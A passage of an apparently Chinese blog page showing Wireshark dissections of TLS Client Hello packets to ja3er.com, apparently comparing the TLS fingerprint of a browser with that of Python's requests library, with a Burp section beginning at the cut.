class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line">Transport Layer Security</span><br><span class="line">    TLSv1.2 Record Layer: Handshake Protocol: Client Hello</span><br><span class="line">        Content Type: Handshake (22)</span><br><span class="line">        Version: TLS 1.0 (0x0301)</span><br><span class="line">        Length: 512</span><br><span class="line">        Handshake Protocol: Client Hello</span><br><span class="line">            Handshake Type: Client Hello (1)</span><br><span class="line">            Length: 508</span><br><span class="line">            Version: TLS 1.2 (0x0303)</span><br><span class="line">            Random: eec68fa63c113f8ce38c2eb99a7731f47240f96a42e96f11148abcc2aefc1593</span><br><span class="line">                GMT Unix Time: Dec 10, 2096 23:05:10.000000000 CST</span><br><span class="line">                Random Bytes: 3c113f8ce38c2eb99a7731f47240f96a42e96f11148abcc2aefc1593</span><br><span class="line">            Session ID Length: 32</span><br><span class="line">            Session ID: acfa18829ca99b15a5aeed76ac5179f390ce296e9d7d8b426bf5b5a262014a58</span><br><span class="line">            Cipher Suites Length: 32</span><br><span class="line">            Cipher Suites (16 suites)</span><br><span class="line">                Cipher Suite: Reserved (GREASE) (0xdada)</span><br><span class="line">                Cipher Suite: TLS_AES_128_GCM_SHA256 (0x1301)</span><br><span class="line">                Cipher Suite: TLS_AES_256_GCM_SHA384 (0x1302)</span><br><span class="line">                Cipher Suite: TLS_CHACHA20_POLY1305_SHA256 (0x1303)</span><br><span class="line">                Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256 (0xc02b)</span><br><span class="line">                Cipher Suite: TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (0xc02f)</span><br><span class="line">                Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384 (0xc02c)</span><br><span class="line">                Cipher Suite: TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (0xc030)</span><br><span class="line">                Cipher Suite: TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256 (0xcca9)</span><br><span class="line">                Cipher Suite: TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256 (0xcca8)</span><br><span class="line">                Cipher Suite: TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (0xc013)</span><br><span class="line">                Cipher Suite: TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (0xc014)</span><br><span class="line">                Cipher Suite: TLS_RSA_WITH_AES_128_GCM_SHA256 (0x009c)</span><br><span class="line">                Cipher Suite: TLS_RSA_WITH_AES_256_GCM_SHA384 (0x009d)</span><br><span class="line">                Cipher Suite: TLS_RSA_WITH_AES_128_CBC_SHA (0x002f)</span><br><span class="line">                Cipher Suite: TLS_RSA_WITH_AES_256_CBC_SHA (0x0035)</span><br><span class="line">            Compression Methods Length: 1</span><br><span class="line">            Compression Methods (1 method)</span><br><span class="line">                Compression Method: null (0)</span><br><span class="line">            Extensions Length: 403</span><br><span class="line">            Extension: Reserved (GREASE) (len&#x3D;0)</span><br><span class="line">                Type: Reserved (GREASE) (47802)</span><br><span class="line">                Length: 0</span><br><span class="line">                Data: &lt;MISSING&gt;</span><br><span class="line">            Extension: server_name (len&#x3D;14)</span><br><span class="line">                Type: server_name (0)</span><br><span class="line">                Length: 14</span><br><span class="line">                Server Name Indication extension</span><br><span class="line">                    Server Name list length: 12</span><br><span class="line">                    Server Name Type: host_name (0)</span><br><span class="line">                    Server Name length: 9</span><br><span class="line">                    Server Name: ja3er.com</span><br><span class="line">            Extension: extended_master_secret (len&#x3D;0)</span><br><span class="line">                Type: extended_master_secret (23)</span><br><span class="line">                Length: 0</span><br><span class="line">            Extension: renegotiation_info (len&#x3D;1)</span><br><span class="line">                Type: renegotiation_info (65281)</span><br><span class="line">                Length: 1</span><br><span class="line">                Renegotiation Info extension</span><br><span class="line">                    Renegotiation info extension length: 0</span><br><span class="line">            Extension: supported_groups (len&#x3D;10)</span><br><span class="line">                Type: supported_groups (10)</span><br><span class="line">                Length: 10</span><br><span class="line">                Supported Groups List Length: 8</span><br><span class="line">                Supported Groups (4 groups)</span><br><span class="line">                    Supported Group: Reserved (GREASE) (0xdada)</span><br><span class="line">                    Supported Group: x25519 (0x001d)</span><br><span class="line">                    Supported Group: secp256r1 (0x0017)</span><br><span class="line">                    Supported Group: secp384r1 (0x0018)</span><br><span class="line">            Extension: ec_point_formats (len&#x3D;2)</span><br><span class="line">                Type: ec_point_formats (11)</span><br><span class="line">                Length: 2</span><br><span class="line">                EC point formats Length: 1</span><br><span class="line">                Elliptic curves point formats (1)</span><br><span class="line">                    EC point format: uncompressed (0)</span><br><span class="line">            Extension: session_ticket (len&#x3D;0)</span><br><span class="line">                Type: session_ticket (35)</span><br><span class="line">                Length: 0</span><br><span class="line">                Data (0 bytes)</span><br><span class="line">            Extension: application_layer_protocol_negotiation (len&#x3D;14)</span><br><span class="line">                Type: application_layer_protocol_negotiation (16)</span><br><span class="line">                Length: 14</span><br><span class="line">                ALPN Extension Length: 12</span><br><span class="line">                ALPN Protocol</span><br><span class="line">                    ALPN string length: 2</span><br><span class="line">                    ALPN Next Protocol: h2</span><br><span class="line">                    ALPN string length: 8</span><br><span class="line">                    ALPN Next Protocol: http&#x2F;1.1</span><br><span class="line">            Extension: status_request (len&#x3D;5)</span><br><span class="line">                Type: status_request (5)</span><br><span class="line">                Length: 5</span><br><span class="line">                Certificate Status Type: OCSP (1)</span><br><span class="line">                Responder ID list Length: 0</span><br><span class="line">                Request Extensions Length: 0</span><br><span class="line">            Extension: signature_algorithms (len&#x3D;18)</span><br><span class="line">                Type: signature_algorithms (13)</span><br><span class="line">                Length: 18</span><br><span class="line">                Signature Hash Algorithms Length: 16</span><br><span class="line">                Signature Hash Algorithms (8 algorithms)</span><br><span class="line">                    Signature Algorithm: ecdsa_secp256r1_sha256 (0x0403)</span><br><span class="line">                        Signature Hash Algorithm Hash: SHA256 (4)</span><br><span class="line">                        Signature Hash Algorithm Signature: ECDSA (3)</span><br><span class="line">                    Signature Algorithm: rsa_pss_rsae_sha256 (0x0804)</span><br><span class="line">                        Signature Hash Algorithm Hash: Unknown (8)</span><br><span class="line">                        Signature Hash Algorithm Signature: SM2 (4)</span><br><span class="line">                    Signature Algorithm: rsa_pkcs1_sha256 (0x0401)</span><br><span class="line">                        Signature Hash Algorithm Hash: SHA256 (4)</span><br><span class="line">                        Signature Hash Algorithm Signature: RSA (1)</span><br><span class="line">                    Signature Algorithm: ecdsa_secp384r1_sha384 (0x0503)</span><br><span class="line">                        Signature Hash Algorithm Hash: SHA384 (5)</span><br><span class="line">                        Signature Hash Algorithm Signature: ECDSA (3)</span><br><span class="line">                    Signature Algorithm: rsa_pss_rsae_sha384 (0x0805)</span><br><span class="line">                        Signature Hash Algorithm Hash: Unknown (8)</span><br><span class="line">                        Signature Hash Algorithm Signature: Unknown (5)</span><br><span class="line">                    Signature Algorithm: rsa_pkcs1_sha384 (0x0501)</span><br><span class="line">                        Signature Hash Algorithm Hash: SHA384 (5)</span><br><span class="line">                        Signature Hash Algorithm Signature: RSA (1)</span><br><span class="line">                    Signature Algorithm: rsa_pss_rsae_sha512 (0x0806)</span><br><span class="line">                        Signature Hash Algorithm Hash: Unknown (8)</span><br><span class="line">                        Signature Hash Algorithm Signature: Unknown (6)</span><br><span class="line">                    Signature Algorithm: rsa_pkcs1_sha512 (0x0601)</span><br><span class="line">                        Signature Hash Algorithm Hash: SHA512 (6)</span><br><span class="line">                        Signature Hash Algorithm Signature: RSA (1)</span><br><span class="line">            Extension: signed_certificate_timestamp (len&#x3D;0)</span><br><span class="line">                Type: signed_certificate_timestamp (18)</span><br><span class="line">                Length: 0</span><br><span class="line">            Extension: key_share (len&#x3D;43)</span><br><span class="line">                Type: key_share (51)</span><br><span class="line">                Length: 43</span><br><span class="line">                Key Share extension</span><br><span class="line">                    Client Key Share Length: 41</span><br><span class="line">                    Key Share Entry: Group: Reserved (GREASE), Key Exchange length: 1</span><br><span class="line">                        Group: Reserved (GREASE) (56026)</span><br><span class="line">                        Key Exchange Length: 1</span><br><span class="line">                        Key Exchange: 00</span><br><span class="line">                    Key Share Entry: Group: x25519, Key Exchange length: 32</span><br><span class="line">                        Group: x25519 (29)</span><br><span class="line">                        Key Exchange Length: 32</span><br><span class="line">                        Key Exchange: aa67c165af9f638e61122b18e646e664d62f0ea0f4cc82736528b0b1d1122c76</span><br><span class="line">            Extension: psk_key_exchange_modes (len&#x3D;2)</span><br><span class="line">                Type: psk_key_exchange_modes (45)</span><br><span class="line">                Length: 2</span><br><span class="line">                PSK Key Exchange Modes Length: 1</span><br><span class="line">                PSK Key Exchange Mode: PSK with (EC)DHE key establishment (psk_dhe_ke) (1)</span><br><span class="line">            Extension: supported_versions (len&#x3D;11)</span><br><span class="line">                Type: supported_versions (43)</span><br><span class="line">                Length: 11</span><br><span class="line">                Supported Versions length: 10</span><br><span class="line">                Supported Version: Reserved (GREASE) (0xfafa)</span><br><span class="line">                Supported Version: TLS 1.3 (0x0304)</span><br><span class="line">                Supported Version: TLS 1.2 (0x0303)</span><br><span class="line">                Supported Version: TLS 1.1 (0x0302)</span><br><span class="line">                Supported Version: TLS 1.0 (0x0301)</span><br><span class="line">            Extension: compress_certificate (len&#x3D;3)</span><br><span class="line">                Type: compress_certificate (27)</span><br><span class="line">                Length: 3</span><br><span class="line">                Algorithms Length: 2</span><br><span class="line">                Algorithm: brotli (2)</span><br><span class="line">            Extension: application_settings (len&#x3D;5)</span><br><span class="line">                Type: application_settings (17513)</span><br><span class="line">                Length: 5</span><br><span class="line">                ALPS Extension Length: 3</span><br><span class="line">                Supported ALPN List</span><br><span class="line">                    Supported ALPN Length: 2</span><br><span class="line">                    Supported ALPN: h2</span><br><span class="line">            Extension: Reserved (GREASE) (len&#x3D;1)</span><br><span class="line">                Type: Reserved (GREASE) (35466)</span><br><span class="line">                Length: 1</span><br><span class="line">                Data: 00</span><br><span class="line">            Extension: padding (len&#x3D;202)</span><br><span class="line">                Type: padding (21)</span><br><span class="line">                Length: 202</span><br><span class="line">                Padding Data: 000000000000000000000000000000000000000000000000000000000000000000000000…</span><br></pre></td></tr></table></figure><h2 id="python-requests库"><a href="#python-requests库" class="headerlink" title="python requests库"></a>python requests库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line">Transport Layer Security</span><br><span class="line">    TLSv1.2 Record Layer: Handshake Protocol: Client Hello</span><br><span class="line">        Content Type: Handshake (22)</span><br><span class="line">        Version: TLS 1.0 (0x0301)</span><br><span class="line">        Length: 512</span><br><span class="line">        Handshake Protocol: Client Hello</span><br><span class="line">            Handshake Type: Client Hello (1)</span><br><span class="line">            Length: 508</span><br><span class="line">            Version: TLS 1.2 (0x0303)</span><br><span class="line">            Random: 084798dbb21089e33b2654ccf48fa618a69a0a24d332e28bc63b3179423e9c9c</span><br><span class="line">                GMT Unix Time: May 28, 1974 02:05:15.000000000 CST</span><br><span class="line">                Random Bytes: b21089e33b2654ccf48fa618a69a0a24d332e28bc63b3179423e9c9c</span><br><span class="line">            Session ID Length: 32</span><br><span class="line">            Session ID: 72282eef35a39d03f55111dcbda2f2175bbf746ec8d9cd11aa70505104b18450</span><br><span class="line">            Cipher Suites Length: 86</span><br><span class="line">            Cipher Suites (43 suites)</span><br><span class="line">                Cipher Suite: TLS_AES_256_GCM_SHA384 (0x1302)</span><br><span class="line">                Cipher Suite: TLS_CHACHA20_POLY1305_SHA256 (0x1303)</span><br><span class="line">                Cipher Suite: TLS_AES_128_GCM_SHA256 (0x1301)</span><br><span class="line">                Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384 (0xc02c)</span><br><span class="line">                Cipher Suite: TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (0xc030)</span><br><span class="line">                Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256 (0xc02b)</span><br><span class="line">                Cipher Suite: TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (0xc02f)</span><br><span class="line">                Cipher Suite: TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256 (0xcca9)</span><br><span class="line">                Cipher Suite: TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256 (0xcca8)</span><br><span class="line">                Cipher Suite: TLS_DHE_RSA_WITH_AES_256_GCM_SHA384 (0x009f)</span><br><span class="line">                Cipher Suite: TLS_DHE_RSA_WITH_AES_128_GCM_SHA256 (0x009e)</span><br><span class="line">                Cipher Suite: TLS_DHE_RSA_WITH_CHACHA20_POLY1305_SHA256 (0xccaa)</span><br><span class="line">                Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_256_CCM_8 (0xc0af)</span><br><span class="line">                Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_256_CCM (0xc0ad)</span><br><span class="line">                Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_128_CCM_8 (0xc0ae)</span><br><span class="line">                Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_128_CCM (0xc0ac)</span><br><span class="line">                Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384 (0xc024)</span><br><span class="line">                Cipher Suite: TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384 (0xc028)</span><br><span class="line">                Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256 (0xc023)</span><br><span class="line">                Cipher Suite: TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256 (0xc027)</span><br><span class="line">                Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA (0xc00a)</span><br><span class="line">                Cipher Suite: TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (0xc014)</span><br><span class="line">                Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA (0xc009)</span><br><span class="line">                Cipher Suite: TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (0xc013)</span><br><span class="line">                Cipher Suite: TLS_DHE_RSA_WITH_AES_256_CCM_8 (0xc0a3)</span><br><span class="line">                Cipher Suite: TLS_DHE_RSA_WITH_AES_256_CCM (0xc09f)</span><br><span class="line">                Cipher Suite: TLS_DHE_RSA_WITH_AES_128_CCM_8 (0xc0a2)</span><br><span class="line">                Cipher Suite: TLS_DHE_RSA_WITH_AES_128_CCM (0xc09e)</span><br><span class="line">                Cipher Suite: TLS_DHE_RSA_WITH_AES_256_CBC_SHA256 (0x006b)</span><br><span class="line">                Cipher Suite: TLS_DHE_RSA_WITH_AES_128_CBC_SHA256 (0x0067)</span><br><span class="line">                Cipher Suite: TLS_DHE_RSA_WITH_AES_256_CBC_SHA (0x0039)</span><br><span class="line">                Cipher Suite: TLS_DHE_RSA_WITH_AES_128_CBC_SHA (0x0033)</span><br><span class="line">                Cipher Suite: TLS_RSA_WITH_AES_256_GCM_SHA384 (0x009d)</span><br><span class="line">                Cipher Suite: TLS_RSA_WITH_AES_128_GCM_SHA256 (0x009c)</span><br><span class="line">                Cipher Suite: TLS_RSA_WITH_AES_256_CCM_8 (0xc0a1)</span><br><span class="line">                Cipher Suite: TLS_RSA_WITH_AES_256_CCM (0xc09d)</span><br><span class="line">                Cipher Suite: TLS_RSA_WITH_AES_128_CCM_8 (0xc0a0)</span><br><span class="line">                Cipher Suite: TLS_RSA_WITH_AES_128_CCM (0xc09c)</span><br><span class="line">                Cipher Suite: TLS_RSA_WITH_AES_256_CBC_SHA256 (0x003d)</span><br><span class="line">                Cipher Suite: TLS_RSA_WITH_AES_128_CBC_SHA256 (0x003c)</span><br><span class="line">                Cipher Suite: TLS_RSA_WITH_AES_256_CBC_SHA (0x0035)</span><br><span class="line">                Cipher Suite: TLS_RSA_WITH_AES_128_CBC_SHA (0x002f)</span><br><span class="line">                Cipher Suite: TLS_EMPTY_RENEGOTIATION_INFO_SCSV (0x00ff)</span><br><span class="line">            Compression Methods Length: 1</span><br><span class="line">            Compression Methods (1 method)</span><br><span class="line">                Compression Method: null (0)</span><br><span class="line">            Extensions Length: 349</span><br><span class="line">            Extension: server_name (len&#x3D;14)</span><br><span class="line">                Type: server_name (0)</span><br><span class="line">                Length: 14</span><br><span class="line">                Server Name Indication extension</span><br><span class="line">                    Server Name list length: 12</span><br><span class="line">                    Server Name Type: host_name (0)</span><br><span class="line">                    Server Name length: 9</span><br><span class="line">                    Server Name: ja3er.com</span><br><span class="line">            Extension: ec_point_formats (len&#x3D;4)</span><br><span class="line">                Type: ec_point_formats (11)</span><br><span class="line">                Length: 4</span><br><span class="line">                EC point formats Length: 3</span><br><span class="line">                Elliptic curves point formats (3)</span><br><span class="line">                    EC point format: uncompressed (0)</span><br><span class="line">                    EC point format: ansiX962_compressed_prime (1)</span><br><span class="line">                    EC point format: ansiX962_compressed_char2 (2)</span><br><span class="line">            Extension: supported_groups (len&#x3D;12)</span><br><span class="line">                Type: supported_groups (10)</span><br><span class="line">                Length: 12</span><br><span class="line">                Supported Groups List Length: 10</span><br><span class="line">                Supported Groups (5 groups)</span><br><span class="line">                    Supported Group: x25519 (0x001d)</span><br><span class="line">                    Supported Group: secp256r1 (0x0017)</span><br><span class="line">                    Supported Group: x448 (0x001e)</span><br><span class="line">                    Supported Group: secp521r1 (0x0019)</span><br><span class="line">                    Supported Group: secp384r1 (0x0018)</span><br><span class="line">            Extension: application_layer_protocol_negotiation (len&#x3D;11)</span><br><span class="line">                Type: application_layer_protocol_negotiation (16)</span><br><span class="line">                Length: 11</span><br><span class="line">                ALPN Extension Length: 9</span><br><span class="line">                ALPN Protocol</span><br><span class="line">                    ALPN string length: 8</span><br><span class="line">                    ALPN Next Protocol: http&#x2F;1.1</span><br><span class="line">            Extension: encrypt_then_mac (len&#x3D;0)</span><br><span class="line">                Type: encrypt_then_mac (22)</span><br><span class="line">                Length: 0</span><br><span class="line">            Extension: extended_master_secret (len&#x3D;0)</span><br><span class="line">                Type: extended_master_secret (23)</span><br><span class="line">                Length: 0</span><br><span class="line">            Extension: post_handshake_auth (len&#x3D;0)</span><br><span class="line">                Type: post_handshake_auth (49)</span><br><span class="line">                Length: 0</span><br><span class="line">            Extension: signature_algorithms (len&#x3D;48)</span><br><span class="line">                Type: signature_algorithms (13)</span><br><span class="line">                Length: 48</span><br><span class="line">                Signature Hash Algorithms Length: 46</span><br><span class="line">                Signature Hash Algorithms (23 algorithms)</span><br><span class="line">                    Signature Algorithm: ecdsa_secp256r1_sha256 (0x0403)</span><br><span class="line">                        Signature Hash Algorithm Hash: SHA256 (4)</span><br><span class="line">                        Signature Hash Algorithm Signature: ECDSA (3)</span><br><span class="line">                    Signature Algorithm: ecdsa_secp384r1_sha384 (0x0503)</span><br><span class="line">                        Signature Hash Algorithm Hash: SHA384 (5)</span><br><span class="line">                        Signature Hash Algorithm Signature: ECDSA (3)</span><br><span class="line">                    Signature Algorithm: ecdsa_secp521r1_sha512 (0x0603)</span><br><span class="line">                        Signature Hash Algorithm Hash: SHA512 (6)</span><br><span class="line">                        Signature Hash Algorithm Signature: ECDSA (3)</span><br><span class="line">                    Signature Algorithm: ed25519 (0x0807)</span><br><span class="line">                        Signature Hash Algorithm Hash: Unknown (8)</span><br><span class="line">                        Signature Hash Algorithm Signature: Unknown (7)</span><br><span class="line">                    Signature Algorithm: ed448 (0x0808)</span><br><span class="line">                        Signature Hash Algorithm Hash: Unknown (8)</span><br><span class="line">                        Signature Hash Algorithm Signature: Unknown (8)</span><br><span class="line">                    Signature Algorithm: rsa_pss_pss_sha256 (0x0809)</span><br><span class="line">                        Signature Hash Algorithm Hash: Unknown (8)</span><br><span class="line">                        Signature Hash Algorithm Signature: Unknown (9)</span><br><span class="line">                    Signature Algorithm: rsa_pss_pss_sha384 (0x080a)</span><br><span class="line">                        Signature Hash Algorithm Hash: Unknown (8)</span><br><span class="line">                        Signature Hash Algorithm Signature: Unknown (10)</span><br><span class="line">                    Signature Algorithm: rsa_pss_pss_sha512 (0x080b)</span><br><span class="line">                        Signature Hash Algorithm Hash: Unknown (8)</span><br><span class="line">                        Signature Hash Algorithm Signature: Unknown (11)</span><br><span class="line">                    Signature Algorithm: rsa_pss_rsae_sha256 (0x0804)</span><br><span class="line">                        Signature Hash Algorithm Hash: Unknown (8)</span><br><span class="line">                        Signature Hash Algorithm Signature: SM2 (4)</span><br><span class="line">                    Signature Algorithm: rsa_pss_rsae_sha384 (0x0805)</span><br><span class="line">                        Signature Hash Algorithm Hash: Unknown (8)</span><br><span class="line">                        Signature Hash Algorithm Signature: Unknown (5)</span><br><span class="line">                    Signature Algorithm: rsa_pss_rsae_sha512 (0x0806)</span><br><span class="line">                        Signature Hash Algorithm Hash: Unknown (8)</span><br><span class="line">                        Signature Hash Algorithm Signature: Unknown (6)</span><br><span class="line">                    Signature Algorithm: rsa_pkcs1_sha256 (0x0401)</span><br><span class="line">                        Signature Hash Algorithm Hash: SHA256 (4)</span><br><span class="line">                        Signature Hash Algorithm Signature: RSA (1)</span><br><span class="line">                    Signature Algorithm: rsa_pkcs1_sha384 (0x0501)</span><br><span class="line">                        Signature Hash Algorithm Hash: SHA384 (5)</span><br><span class="line">                        Signature Hash Algorithm Signature: RSA (1)</span><br><span class="line">                    Signature Algorithm: rsa_pkcs1_sha512 (0x0601)</span><br><span class="line">                        Signature Hash Algorithm Hash: SHA512 (6)</span><br><span class="line">                        Signature Hash Algorithm Signature: RSA (1)</span><br><span class="line">                    Signature Algorithm: SHA224 ECDSA (0x0303)</span><br><span class="line">                        Signature Hash Algorithm Hash: SHA224 (3)</span><br><span class="line">                        Signature Hash Algorithm Signature: ECDSA (3)</span><br><span class="line">                    Signature Algorithm: ecdsa_sha1 (0x0203)</span><br><span class="line">                        Signature Hash Algorithm Hash: SHA1 (2)</span><br><span class="line">                        Signature Hash Algorithm Signature: ECDSA (3)</span><br><span class="line">                    Signature Algorithm: SHA224 RSA (0x0301)</span><br><span class="line">                        Signature Hash Algorithm Hash: SHA224 (3)</span><br><span class="line">                        Signature Hash Algorithm Signature: RSA (1)</span><br><span class="line">                    Signature Algorithm: rsa_pkcs1_sha1 (0x0201)</span><br><span class="line">                        Signature Hash Algorithm Hash: SHA1 (2)</span><br><span class="line">                        Signature Hash Algorithm Signature: RSA (1)</span><br><span class="line">                    Signature Algorithm: SHA224 DSA (0x0302)</span><br><span class="line">                        Signature Hash Algorithm Hash: SHA224 (3)</span><br><span class="line">                        Signature Hash Algorithm Signature: DSA (2)</span><br><span class="line">                    Signature Algorithm: SHA1 DSA (0x0202)</span><br><span class="line">                        Signature Hash Algorithm Hash: SHA1 (2)</span><br><span class="line">                        Signature Hash Algorithm Signature: DSA (2)</span><br><span class="line">                    Signature Algorithm: SHA256 DSA (0x0402)</span><br><span class="line">                        Signature Hash Algorithm Hash: SHA256 (4)</span><br><span class="line">                        Signature Hash Algorithm Signature: DSA (2)</span><br><span class="line">                    Signature Algorithm: SHA384 DSA (0x0502)</span><br><span class="line">                        Signature Hash Algorithm Hash: SHA384 (5)</span><br><span class="line">                        Signature Hash Algorithm Signature: DSA (2)</span><br><span class="line">                    Signature Algorithm: SHA512 DSA (0x0602)</span><br><span class="line">                        Signature Hash Algorithm Hash: SHA512 (6)</span><br><span class="line">                        Signature Hash Algorithm Signature: DSA (2)</span><br><span class="line">            Extension: supported_versions (len&#x3D;9)</span><br><span class="line">                Type: supported_versions (43)</span><br><span class="line">                Length: 9</span><br><span class="line">                Supported Versions length: 8</span><br><span class="line">                Supported Version: TLS 1.3 (0x0304)</span><br><span class="line">                Supported Version: TLS 1.2 (0x0303)</span><br><span class="line">                Supported Version: TLS 1.1 (0x0302)</span><br><span class="line">                Supported Version: TLS 1.0 (0x0301)</span><br><span class="line">            Extension: psk_key_exchange_modes (len&#x3D;2)</span><br><span class="line">                Type: psk_key_exchange_modes (45)</span><br><span class="line">                Length: 2</span><br><span class="line">                PSK Key Exchange Modes Length: 1</span><br><span class="line">                PSK Key Exchange Mode: PSK with (EC)DHE key establishment (psk_dhe_ke) (1)</span><br><span class="line">            Extension: key_share (len&#x3D;38)</span><br><span class="line">                Type: key_share (51)</span><br><span class="line">                Length: 38</span><br><span class="line">                Key Share extension</span><br><span class="line">                    Client Key Share Length: 36</span><br><span class="line">                    Key Share Entry: Group: x25519, Key Exchange length: 32</span><br><span class="line">                        Group: x25519 (29)</span><br><span class="line">                        Key Exchange Length: 32</span><br><span class="line">                        Key Exchange: 3fc6f2011e3b8c3d6a5728886dda249793d98739b968a6b14c70ae4929a4ee4a</span><br><span class="line">            Extension: padding (len&#x3D;163)</span><br><span class="line">                Type: padding (21)</span><br><span class="line">                Length: 163</span><br><span class="line">                Padding Data: 000000000000000000000000000000000000000000000000000000000000000000000000…</span><br></pre></td></tr></table></figure><h2 id="Burp"><a href="#Burp" class="headerlink" title="Burp"></a>Burp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 